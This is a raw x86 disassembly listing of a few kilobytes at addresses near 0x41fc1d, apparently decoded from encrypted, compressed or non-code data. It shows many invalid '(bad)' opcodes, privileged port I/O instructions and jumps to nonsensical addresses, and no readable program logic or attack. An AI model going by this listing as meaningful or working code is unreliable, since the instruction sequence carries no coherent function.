  41fc1d:	xor    dl,ch
  41fc1f:	mov    ch,0x2
  41fc21:	frstor [edx]
  41fc23:	jle    0x41fc81
  41fc25:	sti    
  41fc26:	dec    edi
  41fc27:	in     eax,0x64
  41fc29:	mov    bl,0x6e
  41fc2b:	int3   
  41fc2c:	jp     0x41fc77
  41fc2e:	adc    al,0xbf
  41fc30:	push   ebx
  41fc31:	int3   
  41fc32:	sahf   
  41fc33:	sahf   
  41fc34:	(bad)  
  41fc36:	mov    ebp,0xa371035d
  41fc3b:	or     DWORD PTR [edx+0x7d],esp
  41fc3e:	mov    bh,0xa8
  41fc40:	(bad)  
  41fc41:	sbb    ecx,edx
  41fc43:	(bad)  
  41fc44:	fs in  eax,0x3
  41fc47:	fisub  DWORD PTR [esi+0x75]
  41fc4a:	pop    ebx
  41fc4b:	bsf    ebp,edx
  41fc4e:	xor    eax,0xee93461e
  41fc53:	pop    ss
  41fc54:	inc    ecx
  41fc55:	cs inc esp
  41fc57:	les    esp,FWORD PTR [esp+edi*4+0x4e1eefbe]
  41fc5e:	into   
  41fc5f:	into   
  41fc60:	das    
  41fc61:	inc    edi
  41fc62:	and    bl,BYTE PTR [ebp-0x8]
  41fc65:	call   0x449dfe8e
  41fc6a:	sub    eax,0xc5ad3d1
  41fc6f:	push   es
  41fc70:	sub    edx,ecx
  41fc72:	retf   
  41fc73:	fidivr DWORD PTR [edx]
  41fc75:	mov    dh,bh
  41fc77:	fisubr WORD PTR [edi]
  41fc79:	cmp    dh,BYTE PTR [eax+0x35]
  41fc7c:	bound  edi,QWORD PTR cs:[eax+0x62cd5656]
  41fc83:	ret    
  41fc84:	or     eax,0xdc0c5d55
  41fc89:	pop    ebx
  41fc8a:	mov    ecx,0xda46db41
  41fc8f:	out    0x53,al
  41fc91:	sti    
  41fc92:	sub    edi,DWORD PTR [ecx+eiz*1]
  41fc95:	fistp  DWORD PTR [edi+0x28947bc0]
  41fc9b:	dec    ebp
  41fc9c:	cld    
  41fc9d:	sbb    dh,bh
  41fc9f:	jl     0x41fcf5
  41fca1:	rcl    DWORD PTR [ecx+ebp*1-0x5e36c381],0xd2
  41fca9:	outs   dx,BYTE PTR ds:[esi]
  41fcaa:	sbb    eax,0x181b1c12
  41fcaf:	push   ebx
  41fcb0:	rcl    DWORD PTR [ecx],cl
  41fcb2:	mov    ebp,0xbaf9f982
  41fcb7:	pop    ebx
  41fcb8:	inc    ebx
  41fcb9:	sub    DWORD PTR [ebx-0x4d2d4667],0x7f
  41fcc0:	(bad)  
  41fcc1:	cs fucomi st,st(2)
  41fcc4:	push   esi
  41fcc5:	mov    bh,0x1e
  41fcc7:	or     esi,DWORD PTR [edx+0x1a]
  41fcca:	addr16 dec eax
  41fccc:	push   esp
  41fccd:	aas    
  41fcce:	loope  0x41fcea
  41fcd0:	sub    dh,al
  41fcd2:	(bad)  
  41fcd3:	jg     0x41fcd3
  41fcd5:	(bad)
  41fcd8:	mov    dl,0x6b
  41fcda:	and    eax,0x53f74ecb
  41fcdf:	jp     0x41fd14
  41fce1:	jmp    0xe78efb6
  41fce6:	(bad)  
  41fce7:	xchg   edi,eax
  41fce8:	jns    0x41fca6
  41fcea:	loope  0x41fc8d
  41fcec:	(bad)  [ebx]
  41fcee:	push   esp
  41fcef:	xor    eax,0x7390ab82
  41fcf4:	sbb    BYTE PTR [ebp-0x5dd586d5],bl
  41fcfa:	inc    ebp
  41fcfb:	push   0x6ac4eb65
  41fd00:	in     eax,dx
  41fd01:	fdiv   DWORD PTR [ebp+0x2]
  41fd04:	xor    BYTE PTR [ecx],cl
  41fd06:	push   esp
  41fd07:	(bad)  [edi-0x45]
  41fd0a:	sbb    eax,0xcac26a78
  41fd0f:	add    bl,BYTE PTR [ebx]
  41fd11:	in     al,0xc5
  41fd13:	sbb    BYTE PTR [edx],dl
  41fd15:	push   0xffffffcf
  41fd17:	in     al,0x1f
  41fd19:	mov    ch,0xc6
  41fd1b:	lods   al,BYTE PTR ds:[esi]
  41fd1c:	adc    ebp,edx
  41fd1e:	bnd jne 0x41fcd9
  41fd21:	adc    DWORD PTR ds:0xaf06c7c6,ecx
  41fd27:	pop    ebx
  41fd28:	rol    esi,cl
  41fd2a:	cwde   
  41fd2b:	bound  esi,QWORD PTR [esi-0x5c]
  41fd2e:	mov    DWORD PTR [ecx+0x78],ebx
  41fd31:	mov    bl,0x9c
  41fd33:	das    
  41fd34:	daa    
  41fd35:	dec    edx
  41fd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd37:	cmc    
  41fd38:	jb     0x41fd5a
  41fd3a:	sbb    al,0xdb
  41fd3c:	adc    al,0xa
  41fd3e:	inc    edx
  41fd3f:	or     BYTE PTR ds:0x15ee3653,ah
  41fd45:	jmp    0xacc9a734
  41fd4a:	sbb    eax,0xfebf8aec
  41fd4f:	aam    0x14
  41fd51:	mov    esi,0x243934a3
  41fd56:	mov    ds:0x2e6a2a,al
  41fd5b:	inc    edx
  41fd5c:	pushf  
  41fd5d:	pop    es
  41fd5e:	aaa    
  41fd5f:	stc    
  41fd60:	je     0x41fd39
  41fd62:	ja     0x41fd4c
  41fd64:	adc    DWORD PTR [edi],edx
  41fd66:	inc    ecx
  41fd67:	push   cs
  41fd68:	mov    dl,BYTE PTR [esi]
  41fd6a:	int    0x74
  41fd6c:	nop
  41fd6d:	and    BYTE PTR [edi+0x6908cf0c],bl
  41fd73:	push   ebx
  41fd74:	add    bh,BYTE PTR [esi+0x4091caae]
  41fd7a:	or     cl,cl
  41fd7c:	push   0x5139390b
  41fd81:	loop   0x41fd91
  41fd83:	cmc    
  41fd84:	stos   BYTE PTR es:[edi],al
  41fd85:	fs call 0x87253cec
  41fd8b:	loopne 0x41fd7f
  41fd8d:	and    edx,esi
  41fd8f:	mov    ebx,0x9786bcae
  41fd94:	fst    DWORD PTR ds:0x4b96a665
  41fd9a:	adc    ch,ah
  41fd9c:	retf   
  41fd9d:	(bad)  
  41fd9e:	js     0x41fddb
  41fda0:	mov    ch,0xfc
  41fda2:	cli    
  41fda3:	inc    ecx
  41fda4:	mov    eax,DWORD PTR [esi]
  41fda6:	js     0x41fd6b
  41fda8:	scas   eax,DWORD PTR es:[edi]
  41fda9:	inc    ebp
  41fdaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdab:	or     DWORD PTR [ecx-0x54],ebp
  41fdae:	das    
  41fdaf:	jbe    0x41fd92
  41fdb1:	lods   eax,DWORD PTR ds:[esi]
  41fdb2:	mov    dl,0xf8
  41fdb4:	cmp    BYTE PTR [esp+0xf],bh
  41fdb8:	ja     0x41fdac
  41fdba:	in     al,0xc5
  41fdbc:	lods   eax,DWORD PTR ds:[esi]
  41fdbd:	adc    esp,DWORD PTR ds:0xcc42d33b
  41fdc3:	xor    DWORD PTR [ecx-0x62],edx
  41fdc6:	xchg   BYTE PTR [ecx+ebp*8-0x4a],bh
  41fdca:	call   0xfff1:0x88134a7f
  41fdd1:	push   esi
  41fdd2:	ficomp WORD PTR [eax-0x57277d11]
  41fdd8:	jge    0x41fe59
  41fdda:	popf   
  41fddb:	adc    BYTE PTR ds:0x195c5641,ch
  41fde1:	pop    ebx
  41fde2:	pop    eax
  41fde3:	int    0xe3
  41fde5:	cmp    al,0x30
  41fde7:	cwde   
  41fde8:	push   0xffffffa6
  41fdea:	adc    DWORD PTR [ebp+0x11],ecx
  41fded:	les    edx,FWORD PTR [ebx+0x3098222a]
  41fdf3:	sub    BYTE PTR [ebp-0x3a312567],dh
  41fdf9:	scas   eax,DWORD PTR es:[edi]
  41fdfa:	(bad)  
  41fdfb:	iret   
  41fdfc:	rdtsc  
  41fdfe:	dec    esi
  41fdff:	gs push ebp
  41fe01:	pop    ebx
  41fe02:	sahf   
  41fe03:	je     0x41fe6e
  41fe05:	xchg   DWORD PTR [ebx+eax*2-0x3d07946c],ebx
  41fe0c:	push   ebp
  41fe0d:	inc    edx
  41fe0e:	pushf  
  41fe0f:	mov    edi,0x16f1ae0a
  41fe14:	ja     0x41fdcc
  41fe16:	mov    bl,dl
  41fe18:	mov    al,0x86
  41fe1a:	pop    ecx
  41fe1b:	cld    
  41fe1c:	lods   eax,DWORD PTR ds:[esi]
  41fe1d:	test   BYTE PTR [edx+eiz*1+0x20],ch
  41fe21:	cwde   
  41fe22:	or     esi,DWORD PTR [ebx+0x73]
  41fe25:	sbb    bl,ah
  41fe27:	inc    ecx
  41fe28:	loop   0x41fdc3
  41fe2a:	test   al,0xb7
  41fe2c:	int3   
  41fe2d:	ins    BYTE PTR es:[edi],dx
  41fe2e:	pop    esp
  41fe2f:	in     eax,dx
  41fe30:	push   ds
  41fe31:	pop    ebp
  41fe32:	int    0x9b
  41fe34:	xor    DWORD PTR [ebp+0x19],ebx
  41fe37:	push   edi
  41fe38:	mov    BYTE PTR [ecx-0x427d4b6b],bl
  41fe3e:	fucomp st(4)
  41fe40:	nop
  41fe41:	xlat   BYTE PTR ds:[ebx]
  41fe42:	inc    edx
  41fe43:	jg     0x41fdf5
  41fe45:	add    dh,BYTE PTR [ebp-0x3a]
  41fe48:	add    eax,0x36ad80a0
  41fe4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4e:	clc    
  41fe4f:	and    dh,bh
  41fe51:	pop    esp
  41fe52:	adc    eax,0x23592e93
  41fe57:	dec    eax
  41fe58:	jne    0x41fde8
  41fe5a:	lea    edx,[edx-0x3294c693]
  41fe60:	or     esp,DWORD PTR [eax+0x29ad86aa]
  41fe66:	ret    
  41fe67:	imul   esp,DWORD PTR [eax-0x51552406],0xcebdf48a
  41fe71:	fld    DWORD PTR [eax-0x3532f058]
  41fe77:	jmp    0xbfa8:0x28282606
  41fe7e:	int3   
  41fe7f:	inc    eax
  41fe80:	or     BYTE PTR [ecx-0x5a8cccb7],bh
  41fe86:	jle    0x41fef2
  41fe88:	xor    al,0x82
  41fe8a:	push   eax
  41fe8b:	retf   0x4b84
  41fe8e:	dec    eax
  41fe8f:	cmp    eax,0xf5475df5
  41fe94:	mov    cl,0x31
  41fe96:	retf   0xae80
  41fe99:	sbb    eax,0x40dd441b
  41fe9e:	sbb    ebp,DWORD PTR [ebx-0x74]
  41fea1:	pop    eax
  41fea2:	xor    dh,bl
  41fea4:	dec    edx
  41fea5:	mov    al,ds:0xf320708d
  41feaa:	xor    edx,edx
  41feac:	pushf  
  41fead:	push   es
  41feae:	xchg   ebp,eax
  41feaf:	enter  0x59f2,0xdf
  41feb3:	pushf  
  41feb4:	sub    ah,dl
  41feb6:	xchg   ebx,eax
  41feb7:	mov    ebx,0x1b8eb1e8
  41febc:	mov    fs,WORD PTR ds:0x820ed2d8
  41fec2:	stos   BYTE PTR es:[edi],al
  41fec3:	inc    esi
  41fec4:	dec    esp
  41fec5:	outs   dx,DWORD PTR ds:[esi]
  41fec6:	je     0x41fe49
  41fec8:	sub    eax,0xcd0501cf
  41fecd:	cmp    BYTE PTR [esi-0x694796a7],dl
  41fed3:	test   ecx,eax
  41fed5:	xchg   ecx,eax
  41fed6:	jmp    0xa998a1e9
  41fedb:	or     eax,0x6f31492b
  41fee0:	hlt    
  41fee1:	test   eax,0x766109da
  41fee6:	inc    ebx
  41fee7:	sub    esi,DWORD PTR [ecx+0x6f]
  41feea:	loop   0x41ff09
  41feec:	adc    ebp,DWORD PTR [eax]
  41feee:	outs   dx,BYTE PTR ds:[esi]
  41feef:	cmp    eax,esp
  41fef1:	mov    eax,ds:0xfe6a228b
  41fef6:	sbb    eax,0x2ec71d92
  41fefb:	ins    DWORD PTR es:[edi],dx
  41fefc:	xchg   edi,eax
  41fefd:	mov    ch,0x5a
  41feff:	mov    es,WORD PTR [ecx]
  41ff01:	mov    ecx,0x46639281
  41ff06:	xor    eax,0x87285768
  41ff0b:	test   DWORD PTR [ebx-0x65849b49],eax
  41ff11:	xchg   BYTE PTR [eax-0x52],ch
  41ff14:	dec    ebx
  41ff15:	mov    edx,0xc1461457
  41ff1a:	aas    
  41ff1b:	mov    cl,0x2c
  41ff1d:	into   
  41ff1e:	adc    cl,BYTE PTR ds:0x6dd93e55
  41ff24:	sub    BYTE PTR [edi+edi*1],al
  41ff27:	xor    esi,DWORD PTR [ebx-0x53fec805]
  41ff2d:	xor    bh,BYTE PTR [edx-0x3a]
  41ff30:	bswap  edi
  41ff32:	sub    eax,0x6da17884
  41ff37:	jle    0x41fecb
  41ff39:	jb     0x41ff9f
  41ff3b:	ficomp WORD PTR [edi]
  41ff3d:	(bad)  
  41ff3e:	jmp    0x41ff88
  41ff40:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41ff42:	sahf   
  41ff43:	je     0x41ff04
  41ff45:	cwde   
  41ff46:	xchg   ecx,eax
  41ff47:	ins    DWORD PTR es:[edi],dx
  41ff48:	repnz outs dx,BYTE PTR ds:[esi]
  41ff4a:	inc    eax
  41ff4b:	dec    ecx
  41ff4c:	sub    al,0xce
  41ff4e:	or     DWORD PTR [edx-0x5e],ecx
  41ff51:	mov    ecx,esi
  41ff53:	lods   eax,DWORD PTR ds:[esi]
  41ff54:	push   ds
  41ff55:	fidiv  WORD PTR [ebx]
  41ff57:	popa   
  41ff58:	cli    
  41ff59:	mov    ebp,0x6c9c743a
  41ff5e:	xchg   ecx,eax
  41ff5f:	cmp    eax,ebx
  41ff61:	push   ecx
  41ff62:	clc    
  41ff63:	iret   
  41ff64:	nop
  41ff65:	and    DWORD PTR [esi-0x6655bb94],0x3d
  41ff6c:	daa    
  41ff6d:	aam    0x36
  41ff6f:	frstor [esi-0x31e28e5f]
  41ff75:	inc    esi
  41ff76:	dec    eax
  41ff77:	popf   
  41ff78:	sbb    eax,0x93942db2
  41ff7d:	gs hlt 
  41ff7f:	adc    eax,0x4e478029
  41ff84:	loopne 0x41ffe9
  41ff86:	sbb    bh,BYTE PTR [eax-0x5a489af]
  41ff8c:	scas   al,BYTE PTR es:[edi]
  41ff8d:	mov    ah,0xd7
  41ff8f:	jno    0x41ffef
  41ff91:	add    ecx,ecx
  41ff93:	and    BYTE PTR [eax],0x36
  41ff96:	pop    esi
  41ff97:	stos   DWORD PTR es:[edi],eax
  41ff98:	push   ebp
  41ff99:	ds popf 
  41ff9b:	sbb    dh,BYTE PTR [ebx]
  41ff9d:	mov    bh,0x24
  41ff9f:	lods   eax,DWORD PTR ds:[esi]
  41ffa0:	add    DWORD PTR [edi+0x11],ebp
  41ffa3:	cmp    BYTE PTR [ecx],cl
  41ffa5:	call   FWORD PTR [ebx-0x25b937c7]
  41ffab:	daa    
  41ffac:	int3   
  41ffad:	in     al,0x76
  41ffaf:	mov    ebx,0x7d079ca3
  41ffb4:	cmp    eax,esi
  41ffb6:	je     0x41ffda
  41ffb8:	mov    dh,BYTE PTR [eax+edi*1]
  41ffbb:	sub    bl,BYTE PTR [ebx+0x19cafb5b]
  41ffc1:	loopne 0x41ffa0
  41ffc3:	sub    eax,0xcc122735
  41ffc8:	out    0x76,al
  41ffca:	mov    BYTE PTR [ecx+0x5c],bl
  41ffcd:	lods   eax,DWORD PTR ds:[esi]
  41ffce:	adc    eax,0x9542101c
  41ffd3:	jns    0x41ffd4
  41ffd5:	mov    ds:0x9aaa98b1,eax
  41ffda:	mov    esp,0x7d7a43dd
  41ffdf:	adc    eax,0x8c24b077
  41ffe4:	or     ch,ch
  41ffe6:	test   ebx,0xe4d9880e
  41ffec:	call   0x8f615073
  41fff1:	in     al,0xca
  41fff3:	fldenv [esi]
  41fff5:	inc    BYTE PTR [ebx+0x43]
  41fff8:	fldcw  WORD PTR [edi+0x6f]
  41fffb:	shl    DWORD PTR [ebx],0xcb
  41fffe:	push   0xb47ecb0a
  420003:	adc    eax,0x62279885
  420008:	lds    ebx,FWORD PTR [ebx+eax*8]
  42000b:	loopne 0x42004c
  42000d:	sub    al,0x44
  42000f:	cs and eax,0xdbc92ab3
  420015:	mov    ecx,0xf76c9dbd
  42001a:	test   esp,edx
  42001c:	mov    al,0x69
  42001e:	xor    eax,0x302a3695
  420023:	outs   dx,DWORD PTR ds:[esi]
  420024:	(bad)  es:[eax+0x26b17211]
  42002b:	(bad)  
  42002c:	pop    ss
  42002d:	pushf  
  42002e:	(bad)  
  42002f:	shl    DWORD PTR ds:0x65ba7757,0xdd
  420036:	lea    ebp,[edi-0x53]
  420039:	pop    ebp
  42003a:	mov    al,0xe9
  42003c:	pop    ebx
  42003d:	inc    ebp
  42003e:	fwait
  42003f:	lahf   
  420040:	xchg   edx,eax
  420041:	xor    al,0x89
  420044:	inc    esp
  420045:	adc    DWORD PTR [esi+0x3a],ebx
  420048:	lods   al,BYTE PTR ds:[esi]
  420049:	pop    es
  42004a:	and    ebp,DWORD PTR [eax+0x3804717f]
  420050:	stos   DWORD PTR es:[edi],eax
  420051:	jmp    0x993e:0xcbf9b7bc
  420058:	jecxz  0x4200d7
  42005a:	and    bl,dl
  42005c:	nop
  42005d:	dec    ebp
  42005e:	out    dx,eax
  42005f:	adc    al,0x6
  420061:	cmp    al,0x15
  420063:	sahf   
  420064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420065:	addr16 add dh,al
  420068:	mov    esi,ebx
  42006a:	adc    ebx,DWORD PTR [ecx+0x164390b4]
  420070:	xchg   ecx,eax
  420071:	mov    ecx,?
  420073:	or     ch,BYTE PTR [edx+eax*2+0x202c5ff2]
  42007a:	fnstsw WORD PTR [edi-0x7a38df15]
  420080:	mov    eax,0x15ac2d56
  420085:	xchg   esi,eax
  420086:	push   ss
  420087:	ins    DWORD PTR es:[edi],dx
  420088:	push   ecx
  420089:	loope  0x420063
  42008b:	xchg   ebp,eax
  42008c:	mov    ebx,0x770e734f
  420091:	aas    
  420092:	cmp    esi,DWORD PTR [ebx-0x11]
  420095:	fisttp WORD PTR [eax]
  420097:	(bad)  
  420098:	stos   BYTE PTR es:[edi],al
  420099:	into   
  42009a:	sub    al,0x43
  42009c:	pop    ecx
  42009d:	mov    bl,0x55
  42009f:	jge    0x420069
  4200a1:	adc    ebp,esi
  4200a3:	fldenv [ebx+ecx*2-0x6b]
  4200a7:	stc    
  4200a8:	sbb    eax,0x5c34a5e9
  4200ad:	push   ds
  4200ae:	or     eax,0x386af08
  4200b3:	mov    cl,0x26
  4200b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200b6:	loope  0x42012f
  4200b8:	dec    eax
  4200b9:	mov    edi,esp
  4200bb:	retf   
  4200bc:	sbb    al,0xe5
  4200be:	pop    ecx
  4200bf:	sub    BYTE PTR [esi-0x2bb12443],dh
  4200c5:	pusha  
  4200c6:	popf   
  4200c7:	in     al,dx
  4200c8:	sub    eax,edx
  4200ca:	mov    dl,0x24
  4200cc:	jl     0x4200b8
  4200ce:	(bad)  
  4200d0:	mov    edi,0xd97c9e16
  4200d5:	and    edi,DWORD PTR [ebx-0xd]
  4200d8:	ins    DWORD PTR es:[edi],dx
  4200d9:	mov    al,BYTE PTR [edi]
  4200db:	out    dx,eax
  4200dc:	call   0x1aebf828
  4200e1:	dec    eax
  4200e2:	push   0xa5d1bd0a
  4200e7:	push   0x7d
  4200e9:	mov    ebp,0x2e124be5
  4200ee:	xchg   BYTE PTR [eax+ebx*1],ch
  4200f1:	pop    ss
  4200f2:	rol    DWORD PTR [edx+eiz*4+0x1c],cl
  4200f6:	repz dec eax
  4200f8:	mov    dh,0xce
  4200fa:	shl    ebx,cl
  4200fc:	inc    eax
  4200fd:	mov    bl,0x26
  4200ff:	pop    edx
  420100:	(bad)  
  420101:	push   edx
  420102:	xchg   ebp,eax
  420103:	adc    al,BYTE PTR [eax-0x20200688]
  420109:	cmp    eax,esp
  42010b:	out    0xe9,eax
  42010d:	mov    ecx,0x187faded
  420112:	cmp    edi,edi
  420114:	push   edx
  420115:	or     eax,0x3b2cb5bf
  42011a:	fdivr  QWORD PTR [edi-0x7c550ce0]
  420120:	ins    DWORD PTR es:[edi],dx
  420121:	mov    ds:0x1c10e581,al
  420126:	adc    eax,0x76b26db4
  42012b:	and    ebx,DWORD PTR [edi]
  42012d:	sar    dl,1
  42012f:	pop    ds
  420130:	(bad)  
  420131:	icebp  
  420132:	cmp    eax,0x8afdc11a
  420137:	fxch   st(5)
  420139:	push   0x62
  42013b:	mov    cl,0x63
  42013d:	pop    ebp
  42013e:	push   cs
  42013f:	sti    
  420140:	jl     0x420118
  420142:	add    DWORD PTR [ecx-0x7c],esi
  420145:	sbb    eax,0xd6d3c2a6
  42014a:	mov    al,ds:0xb8fe80e2
  42014f:	pop    ecx
  420150:	mov    dh,0xc7
  420152:	pop    edx
  420153:	fdiv   DWORD PTR es:[edi]
  420156:	push   ds
  420157:	inc    ebx
  420158:	cmp    eax,0x1676a5fd
  42015d:	mov    ebx,0x6e5d8493
  420162:	push   ss
  420163:	and    DWORD PTR [esi],ebp
  420165:	repnz sbb bh,BYTE PTR ds:0x9b90ec5d
  42016c:	data16 jb 0x4200f3
  42016f:	xor    al,0x28
  420171:	ins    BYTE PTR es:[edi],dx
  420172:	std    
  420173:	xchg   BYTE PTR [ebp-0x7405499f],bh
  420179:	enter  0x2a57,0xdb
  42017d:	ret    0xc40f
  420180:	shrd   DWORD PTR [esi+0x32bbdf45],ecx,cl
  420187:	int    0xf8
  420189:	or     esp,DWORD PTR [ebp-0x76]
  42018c:	bound  ebp,QWORD PTR [ebp-0x49]
  42018f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420190:	inc    edi
  420191:	mov    ah,0x1e
  420193:	cmp    al,ah
  420195:	fst    st(6)
  420197:	inc    edi
  420198:	mov    esp,0x1ffc4a95
  42019d:	icebp  
  42019e:	scas   eax,DWORD PTR es:[edi]
  42019f:	mov    dh,0x8b
  4201a1:	inc    ebp
  4201a2:	popa   
  4201a3:	or     DWORD PTR [eax+edx*4],ebx
  4201a6:	push   ds
  4201a7:	cmp    eax,0xfd5632c3
  4201ac:	into   
  4201ad:	or     cl,al
  4201af:	mov    eax,gs:0x211ce36c
  4201b5:	fisttp QWORD PTR [ebp-0x12]
  4201b8:	ss retf 
  4201ba:	int3   
  4201bb:	pop    es
  4201bc:	push   ds
  4201bd:	mov    dh,0x16
  4201bf:	in     eax,0x5b
  4201c1:	add    bl,BYTE PTR [eax+0x4599858d]
  4201c7:	repz into 
  4201c9:	out    dx,al
  4201ca:	call   0x2fbd:0x24f3bd75
  4201d1:	in     eax,0xa6
  4201d3:	dec    ebx
  4201d4:	or     eax,0xbb868e24
  4201d9:	jecxz  0x4201b6
  4201db:	icebp  
  4201dc:	aas    
  4201dd:	mov    dh,BYTE PTR [ebx]
  4201df:	fstp   DWORD PTR [ebx+0x5e]
  4201e2:	add    edx,DWORD PTR [edx]
  4201e4:	mov    dl,0xcf
  4201e6:	add    DWORD PTR [edx],ebx
  4201e8:	pushf  
  4201e9:	push   ds
  4201ea:	xchg   esp,eax
  4201eb:	(bad)  
  4201ec:	aaa    
  4201ed:	pop    edi
  4201ee:	push   esi
  4201ef:	sbb    edi,eax
  4201f1:	aad    0x6f
  4201f3:	shr    DWORD PTR [ebx+0x1e],cl
  4201f6:	mov    esi,0x48e4afb
  4201fb:	lods   eax,DWORD PTR ds:[esi]
  4201fc:	das    
  4201fd:	mov    esp,0xa3484894
  420202:	pop    ss
  420203:	pop    edx
  420204:	fsubr  DWORD PTR [esi]
  420206:	gs icebp 
  420208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420209:	push   0x1e
  42020b:	loopne 0x420288
  42020d:	mov    ah,0x59
  42020f:	(bad)  
  420211:	mov    DWORD PTR [ebp-0x6f],esp
  420214:	adc    ch,BYTE PTR [ebx-0xc]
  420217:	sbb    al,0xfb
  420219:	dec    edx
  42021a:	into   
  42021b:	out    0x4c,eax
  42021d:	es pop esi
  42021f:	mov    esi,0xc8f7684c
  420224:	daa    
  420225:	cmp    DWORD PTR [ecx-0x75],0xffffffc0
  420229:	repz cmp BYTE PTR [ecx-0x7ef0b864],bl
  420230:	dec    eax
  420231:	test   eax,0x7066a598
  420236:	mov    esi,0xfada22ba
  42023b:	dec    ecx
  42023c:	xor    dl,BYTE PTR [eax]
  42023e:	cmp    al,0xe5
  420240:	add    esi,DWORD PTR [edi-0x2a70daed]
  420246:	push   es
  420247:	std    
  420248:	aaa    
  420249:	and    eax,0x4defbf0f
  42024e:	inc    ebx
  42024f:	cmp    eax,0x9036e558
  420254:	shl    BYTE PTR ds:0xf6ed85f5,0xb2
  42025b:	stos   BYTE PTR es:[edi],al
  42025c:	or     dh,BYTE PTR [edi]
  42025e:	shr    BYTE PTR [esi-0x4d],cl
  420261:	sub    BYTE PTR [esi-0x4084fbb8],0x11
  420268:	mov    DWORD PTR [edi],edx
  42026a:	pushf  
  42026b:	inc    ebx
  42026c:	sbb    eax,0x26319a13
  420271:	ror    BYTE PTR [esi-0x7f2378a3],1
  420277:	jmp    0x420207
  420279:	sbb    ch,BYTE PTR [esi+0x33]
  42027c:	in     al,dx
  42027d:	jbe    0x4202f8
  42027f:	ja     0x4202d0
  420281:	test   al,0x8a
  420283:	fst    st(6)
  420285:	xlat   BYTE PTR ds:[ebx]
  420286:	push   cs
  420287:	jo     0x420271
  420289:	inc    esi
  42028a:	pushf  
  42028b:	lds    ecx,FWORD PTR [ecx-0x1d]
  42028e:	pop    ss
  42028f:	lds    ebp,FWORD PTR [esi-0x38]
  420292:	jns    0x420232
  420294:	dec    ebx
  420295:	lods   al,BYTE PTR ds:[si]
  420297:	pop    edi
  420298:	aam    0xa1
  42029a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42029b:	adc    BYTE PTR [edx],cl
  42029d:	adc    ch,al
  42029f:	rcr    edx,cl
  4202a1:	cmp    DWORD PTR [esp+ebp*1],ebx
  4202a4:	out    dx,eax
  4202a5:	mov    ds:0xb2624ab,al
  4202aa:	adc    al,0x97
  4202ac:	adc    DWORD PTR [ecx+0x6370fd0b],ecx
  4202b2:	add    eax,0x5d84e0df
  4202b7:	dec    edx
  4202b8:	(bad)  
  4202b9:	xor    BYTE PTR [edi+0x480a5f8b],bl
  4202bf:	dec    esi
  4202c0:	xchg   ebp,eax
  4202c1:	mov    ecx,0x6b999f9e
  4202c6:	outs   dx,DWORD PTR ds:[esi]
  4202c7:	push   ss
  4202c8:	push   ss
  4202c9:	ins    DWORD PTR es:[edi],dx
  4202ca:	sbb    dh,BYTE PTR [eax+0x49d4db53]
  4202d0:	xchg   edx,eax
  4202d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202d2:	pop    ebx
  4202d3:	mov    ebp,0x4eaf6bbc
  4202d8:	sub    DWORD PTR [eax],0x63
  4202db:	push   edi
  4202dc:	rcl    ecx,1
  4202de:	in     al,0x14
  4202e0:	scas   eax,DWORD PTR es:[edi]
  4202e1:	xlat   BYTE PTR ds:[ebx]
  4202e2:	xor    DWORD PTR [ebp-0x1e2aee13],ebp
  4202e8:	test   al,0x67
  4202ea:	arpl   WORD PTR [edx+eax*8],sp
  4202ed:	sbb    ebx,ebp
  4202ef:	xor    dh,ah
  4202f1:	dec    ebx
  4202f2:	jle    0x4202be
  4202f4:	dec    ebp
  4202f5:	mov    al,0xc5
  4202f7:	pop    eax
  4202f8:	data16 or cl,bl
  4202fb:	mov    WORD PTR [ebx+0x76d65ba5],ds
  420301:	pop    ebx
  420302:	ja     0x4202c4
  420304:	add    ebp,edi
  420306:	scas   eax,DWORD PTR es:[edi]
  420307:	inc    edx
  420308:	(bad)  
  42030a:	xchg   ecx,eax
  42030b:	adc    ch,dh
  42030d:	xor    edx,DWORD PTR [esi]
  42030f:	pop    ss
  420310:	jg     0x42036a
  420312:	xor    cl,BYTE PTR [ecx+0x573e2ae0]
  420318:	jo     0x42035b
  42031a:	jle    0x4202a6
  42031c:	cli    
  42031d:	mov    ebp,DWORD PTR [eax-0x3d]
  420320:	(bad)
  420323:	xor    BYTE PTR [edi],al
  420325:	outs   dx,DWORD PTR ds:[esi]
  420326:	aad    0xc2
  420328:	cmp    BYTE PTR fs:[eax-0x32],dh
  42032c:	hlt    
  42032d:	stos   BYTE PTR es:[edi],al
  42032e:	mov    esp,0xdd9eb06f
  420333:	adc    ecx,DWORD PTR [ebx]
  420335:	xchg   edx,eax
  420336:	std    
  420337:	jmp    0x42036d
  420339:	pop    edi
  42033a:	aad    0x40
  42033c:	cmp    al,0x38
  42033e:	mov    eax,ds:0x93a117f0
  420343:	(bad)  [edi+0x5fda7f75]
  420349:	jl     0x4202ee
  42034b:	fwait
  42034c:	push   0x667d9804
  420351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420352:	stos   BYTE PTR es:[edi],al
  420353:	add    dl,BYTE PTR cs:[edi+0x73]
  420357:	add    eax,0x9220dc36
  42035c:	sub    BYTE PTR [ecx-0x6321fe5c],dh
  420362:	xchg   DWORD PTR [esi],ebp
  420364:	ror    BYTE PTR [ebx],0x45
  420367:	int    0x44
  420369:	arpl   cx,ax
  42036b:	jge    0x420340
  42036d:	outs   dx,DWORD PTR ds:[esi]
  42036e:	mov    BYTE PTR [ebp+0x1144dcd7],bh
  420374:	shr    DWORD PTR [edx+esi*1],0xc0
  420378:	out    dx,eax
  420379:	dec    ecx
  42037a:	push   esp
  42037b:	loop   0x420333
  42037d:	or     esi,ebp
  42037f:	lock cdq 
  420381:	fist   DWORD PTR [ebx+0x41]
  420384:	daa    
  420385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420386:	clc    
  420387:	jg     0x42036c
  420389:	sar    DWORD PTR fs:[ebx+0x1d],0x8a
  42038e:	jl     0x420325
  420390:	dec    esi
  420391:	mov    eax,gs
  420393:	mov    ds:0xc92ca25d,al
  420398:	outs   dx,BYTE PTR ds:[esi]
